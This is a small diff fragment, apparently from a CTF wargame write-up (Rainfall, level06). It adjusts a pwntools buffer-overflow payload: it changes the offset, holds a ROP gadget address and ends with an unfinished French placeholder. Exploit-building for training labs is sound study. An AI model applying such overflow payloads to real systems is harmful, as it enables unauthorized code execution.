@@ -27,7 +27,7 @@ warning: 44	./nptl/pthread_kill.c: No such file or directory
 ********
 level06@rainfall:~$ python3 -c "
 from pwn import *
-offset = 200
+offset = 199
 gadget = 0x7ffff7cef5ce
 payload = b'A'*offset
 payload += p64(ICI AJOUTER)
